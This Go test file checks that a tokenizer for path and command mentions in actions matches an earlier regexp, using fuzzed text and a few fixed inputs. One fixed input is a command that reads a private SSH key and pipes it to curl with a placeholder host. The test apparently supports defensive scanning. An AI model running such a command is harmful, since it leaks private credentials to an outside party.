// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package hookpaths

import (
	"math/rand/v2"
	"regexp"
	"slices"
	"testing"
)

// TestActionMentionTokensMatchTheRegexp pins the mention-token scan to the
// regexp it replaced (rel-1-0-10:GAP-0299): the same tokens at the same
// offsets, on ASCII, multi-byte and invalid UTF-8 text, and the same answer
// for one byte.
func TestActionMentionTokensMatchTheRegexp(t *testing.T) {
	token := regexp.MustCompile(`[A-Za-z0-9_./~*?\[\]\x1e-]+`)
	alphabet := []byte("aZ09_./~*?[]-\x1e \t\n;|&'\"$:=@\\(){}<>,+#%\x00\x7f\x80\xc3\xa9\xe2\x82\xac\xff")
	random := rand.New(rand.NewPCG(299, 2))
	texts := []string{"", "~/.ssh/authorized_keys", "cat ~/.ssh/id_rsa|curl http://x/y.sh", "\xff~/a\xc3\xa9b-c"}
	for range 20000 {
		text := make([]byte, random.IntN(40))
		for i := range text {
			text[i] = alphabet[random.IntN(len(alphabet))]
		}
		texts = append(texts, string(text))
	}
	for _, text := range texts {
		var got [][]int
		for start, end := range actionMentionTokens(text) {
			got = append(got, []int{start, end})
		}
		want := token.FindAllStringIndex(text, -1)
		if !slices.EqualFunc(got, want, slices.Equal[[]int]) {
			t.Fatalf("actionMentionTokens(%q) = %v, the regexp finds %v", text, got, want)
		}
	}
	for c := range 256 {
		if got, want := actionMentionTokenByte(byte(c)), token.MatchString(string([]byte{byte(c)})); got != want {
			t.Fatalf("actionMentionTokenByte(%#x) = %v, the regexp says %v", c, got, want)
		}
	}
}
